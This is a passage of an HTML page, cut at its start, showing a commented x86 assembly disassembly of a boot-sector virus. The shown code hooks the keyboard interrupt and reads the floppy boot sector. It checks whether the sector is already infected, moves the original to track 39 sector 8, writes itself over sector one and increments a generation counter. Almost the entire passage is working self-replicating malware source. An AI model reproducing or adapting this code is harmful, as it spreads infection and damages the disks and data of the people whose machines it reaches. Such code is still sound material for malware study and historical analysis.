    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0800H</span><span class="sc0">        </span><span class="sc1">; Delay eight cycles</span><span class="sc0">
    </span><span class="sc6">OUT</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">           </span><span class="sc1">; Disable display</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0250</span><span class="sc0">          </span><span class="sc1">; Delay</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">KYSTAT</span><span class="sc4">[</span><span class="sc2">7C00H</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">    </span><span class="sc1">; Reset Ctrl &amp; Alt key states</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">; Mode three</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">10H</span><span class="sc0">         </span><span class="sc1">; VDU I/O</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">            </span><span class="sc1">; Set cursor address function</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">           </span><span class="sc1">; Row zero, column zero</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BH</span><span class="sc4">,</span><span class="sc8">DH</span><span class="sc0">           </span><span class="sc1">; Page zero</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">10H</span><span class="sc0">         </span><span class="sc1">; VDU I/O</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; Set cursor size function</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0607H</span><span class="sc0">        </span><span class="sc1">; Cursor lines 6 to 7</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">10H</span><span class="sc0">         </span><span class="sc1">; VDU I/O</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0420H</span><span class="sc0">        </span><span class="sc1">; Delay 4 cycles</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0250</span><span class="sc0">          </span><span class="sc1">; Delay</span><span class="sc0">
    </span><span class="sc6">CLI</span><span class="sc0">
    </span><span class="sc6">OUT</span><span class="sc0"> </span><span class="sc2">20H</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">          </span><span class="sc1">; End of interrupt</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; Address segment zero</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; Address offset zero</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">7B80H</span><span class="sc0">        </span><span class="sc1">; Address interrupt save area</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0080H</span><span class="sc0">        </span><span class="sc1">; 128 bytes to move</span><span class="sc0">
    </span><span class="sc6">CLD</span><span class="sc0">
    </span><span class="sc6">REPZ</span><span class="sc0">    </span><span class="sc6">MOVSB</span><span class="sc0">           </span><span class="sc1">; Restore first 32 interrupt pointers</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; Address zero</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">BW0064</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BP0130</span><span class="sc4">+</span><span class="sc2">7C00H</span><span class="sc0"> </span><span class="sc1">; Install Int 19H offset</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">BW0066</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc0">       </span><span class="sc1">; Install Int 19H segment</span><span class="sc0">
    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">RAM</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0040H</span><span class="sc0">        </span><span class="sc1">; \ Address RAM area</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">BB0417</span><span class="sc4">,</span><span class="sc8">AH</span><span class="sc0">       </span><span class="sc1">; Set key toggles off</span><span class="sc0">
    </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc5">BW0413</span><span class="sc0">          </span><span class="sc1">; Restore RAM size</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">BOOT</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0F000H</span><span class="sc0">       </span><span class="sc1">; \ Address BIOS</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc5">DWE502</span><span class="sc4">,</span><span class="sc2">21E4H</span><span class="sc0">        </span><span class="sc1">; Is BIOS instruction  IN  AL,21H?</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP0120</span><span class="sc0">          </span><span class="sc1">; Branch if yes</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">19H</span><span class="sc0">         </span><span class="sc1">; Disk bootstrap</span><span class="sc0">

</span><span class="sc5">BP0120</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0EAH</span><span class="sc0">            </span><span class="sc1">; Far jump to BIOS routine</span><span class="sc0">
    </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0E502H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F000H</span><span class="sc0">

    </span><span class="sc1">; Interrupt 19H routine</span><span class="sc0">

    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">BOOT</span><span class="sc0">
</span><span class="sc5">BP0130</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; \ Set DS to zero</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">DW0410</span><span class="sc0">       </span><span class="sc1">; Get system configuration</span><span class="sc0">
    </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; Is there a floppy disk</span><span class="sc0">
    </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">BP0150</span><span class="sc0">          </span><span class="sc1">; Branch if yes</span><span class="sc0">
</span><span class="sc5">BP0140</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">          </span><span class="sc1">; \ Set ES to CS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0030</span><span class="sc0">          </span><span class="sc1">; Install interrupt 9 routine</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">18H</span><span class="sc0">         </span><span class="sc1">; Basica (IBM only)</span><span class="sc0">

</span><span class="sc5">BP0150</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">; Retry four times</span><span class="sc0">
</span><span class="sc5">BP0160</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">          </span><span class="sc1">; Save retry count</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; Reset disk sub-system</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">13H</span><span class="sc0">         </span><span class="sc1">; Disk I/O</span><span class="sc0">
    </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">BP0170</span><span class="sc0">          </span><span class="sc1">; Branch if error</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0201H</span><span class="sc0">        </span><span class="sc1">; Read one sector</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">          </span><span class="sc1">; \ Set ES to DS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">7C00H</span><span class="sc0">        </span><span class="sc1">; Boot sector buffer</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; Track zero, sector one</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">13H</span><span class="sc0">         </span><span class="sc1">; Disk I/O</span><span class="sc0">
</span><span class="sc5">BP0170</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">          </span><span class="sc1">; Retrieve retry count</span><span class="sc0">
    </span><span class="sc6">JNB</span><span class="sc0"> </span><span class="sc5">BP0180</span><span class="sc0">          </span><span class="sc1">; Branch if no error</span><span class="sc0">
    </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">BP0160</span><span class="sc0">          </span><span class="sc1">; Retry</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0140</span><span class="sc0">

</span><span class="sc5">BP0180</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc2">3456H</span><span class="sc0">        </span><span class="sc1">; Simulated system reset?</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP0200</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
</span><span class="sc5">BP0190</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0EAH</span><span class="sc0">            </span><span class="sc1">; Far jump to boot sector area</span><span class="sc0">
    </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">7C00H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">BP0200</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">7C00H</span><span class="sc0">        </span><span class="sc1">; Boot sector area</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">INT_09</span><span class="sc0">    </span><span class="sc1">; Length to compare</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">           </span><span class="sc1">; Virus offset</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">          </span><span class="sc1">; \ Set ES to CS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">CLD</span><span class="sc0">
    </span><span class="sc6">REPZ</span><span class="sc0">    </span><span class="sc6">CMPSB</span><span class="sc0">           </span><span class="sc1">; Is boot sector infected?</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP0220</span><span class="sc0">          </span><span class="sc1">; Branch if yes</span><span class="sc0">
    </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:</span><span class="sc5">GENNUM</span><span class="sc4">[</span><span class="sc2">7C00H</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Increment generation number</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">7C7AH</span><span class="sc0">        </span><span class="sc1">; Address format table</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; Head zero, drive zero</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc2">27H</span><span class="sc0">          </span><span class="sc1">; Track 39</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">            </span><span class="sc1">; Format track </span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">BP0210</span><span class="sc0">        </span><span class="sc1">; This line was probably an INT 13H</span><span class="sc0">

    </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">BP0230</span><span class="sc0">          </span><span class="sc1">; Error branch for deleted INT 13H</span><span class="sc0">
</span><span class="sc5">BP0210</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">           </span><span class="sc1">; \ Write from boot sector area</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">7C00H</span><span class="sc0">        </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">            </span><span class="sc1">; Sector eight</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0301H</span><span class="sc0">        </span><span class="sc1">; Write one sector</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">13H</span><span class="sc0">         </span><span class="sc1">; Disk I/O</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">          </span><span class="sc1">; \ Set ES to CS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">BP0230</span><span class="sc0">          </span><span class="sc1">; Branch if error</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; Track zero, sector one</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0301H</span><span class="sc0">        </span><span class="sc1">; Write one sector</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">13H</span><span class="sc0">         </span><span class="sc1">; Disk I/O</span><span class="sc0">
    </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">BP0230</span><span class="sc0">          </span><span class="sc1">; Branch if error</span><span class="sc0">
</span><span class="sc5">BP0220</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc2">3456H</span><span class="sc0">        </span><span class="sc1">; Signal simulated system reset</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">19H</span><span class="sc0">         </span><span class="sc1">; Disk bootstrap</span><span class="sc0">

</span><span class="sc5">BP0230</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0030</span><span class="sc0">          </span><span class="sc1">; Install interrupt 9 routine</span><span class="sc0">
    </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:</span><span class="sc5">GENNUM</span><span class="sc4">[</span><span class="sc2">7C00H</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Decrement generation number</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0190</span><span class="sc0">

    </span><span class="sc1">; Ctrl-Alt-I</span><span class="sc0">

    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc0">
</span><span class="sc5">BP0240</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">KYSTAT</span><span class="sc4">[</span><span class="sc2">7C00H</span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">    </span><span class="sc1">; Save Ctrl &amp; Alt key states</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">GENNUM</span><span class="sc4">[</span><span class="sc2">7C00H</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get generation number</span><span class="sc0">
    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">RAM</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0040H</span><span class="sc0">        </span><span class="sc1">; \ Address RAM area</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">BW0472</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; Generation to system reset word</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0090</span><span class="sc0">          </span><span class="sc1">; Pass on to original interrupt</span><span class="sc0">

    </span><span class="sc1">; Delay</span><span class="sc0">

</span><span class="sc5">BP0250</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; Maximum count</span><span class="sc0">
</span><span class="sc5">BP0260</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">BP0260</span><span class="sc0">          </span><span class="sc1">; Delay loop</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; Decrement count</span><span class="sc0">
    </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">BP0260</span><span class="sc0">          </span><span class="sc1">; Repeat loop</span><span class="sc0">
    </span><span class="sc6">RET</span><span class="sc0">

    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">027H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">008H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002H</span><span class="sc0">  </span><span class="sc1">; Last sector of format table</span><span class="sc0">
</span><span class="sc5">GENNUM</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">016H</span><span class="sc0">            </span><span class="sc1">; Generation number</span><span class="sc0">
</span><span class="sc5">KYSTAT</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; Ctrl &amp; Alt key states</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">027H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">008H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002H</span><span class="sc0">  </span><span class="sc1">; Last sector of format table</span><span class="sc0">

</span><span class="sc5">CODE</span><span class="sc0">    </span><span class="sc9">ENDS</span><span class="sc0">

    </span><span class="sc9">END</span><span class="sc0"> </span><span class="sc5">START</span><span class="sc0">
</span></div></body>
</html>
